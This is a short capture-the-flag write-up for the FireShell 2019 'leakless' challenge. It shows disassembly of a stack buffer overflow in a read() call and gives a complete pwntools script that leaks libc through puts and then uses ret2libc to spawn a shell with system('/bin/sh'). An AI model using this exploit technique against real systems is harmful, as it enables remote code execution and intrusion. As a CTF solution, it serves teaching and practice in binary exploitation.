+++
title = "FireShell 2019 - leakless"
date = "2019-01-28 06:54:21"
categories = ["pwn", "writeup"]
+++
## download
- [binary](/assets/fireshell/leakless/leakless)
- [solve.py](/assets/fireshell/leakless/solve.py)

## summary
1. buffer overflow in `sym.feedme`
```asm
0x080485cb  push ebp
0x080485cc  mov ebp, esp
0x080485ce  push ebx
0x080485cf  sub esp, 0x44               ; stack frame size = 0x44
0x080485d2  call sym.__x86.get_pc_thunk.ax
0x080485d7  add eax, 0x1a29
0x080485dc  sub esp, 4
0x080485df  push 0x100                  ; nbyte = 0x100 <--- overflow
0x080485e4  lea edx, dword [ebp-0x48]
0x080485e7  push edx                    ; void *buf
0x080485e8  push 0                      ; int fd
0x080485ea  mov ebx, eax
0x080485ec  call sym.imp.read           ; ssize_t read(fd, buf, nbytes)
0x080485f1  add esp, 0x10
0x080485f4  nop
0x080485f5  mov ebx, dword [ebp-0x4]
0x080485f8  leave
0x080485f9  ret
```
2. straight to the point ret2libc ROP as the binary still has `puts` to use as leak

## exploit
```python
#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux', 'split-window', '-h']
elf = ELF('./leakless', checksec=False)

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
    libc = ELF('./libc.so.6', checksec=False)
else:
    r = elf.process()
    libc = ELF('/usr/lib32/libc.so.6', checksec=False)
    gdb.attach(r, 'b *0x080485f9')

payload  = 'A' * 76
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['feedme'])
payload += p32(elf.got['puts'])

r.sendline(payload)
leak = r.recv()
# print hex(u32(leak[0:4]))
libc.address = u32(leak[0:4]) - libc.symbols['puts']

payload  = 'A' * 76
payload += p32(libc.sym['system'])
payload += p32(libc.sym['exit'])
payload += p32(next(libc.search('/bin/sh')))

r.sendline(payload)

r.interactive()
```

## footnote
As the name implies, this problem shouldn't be fairly easy because
I guess the intended solution should be using `ret2dlresolve`.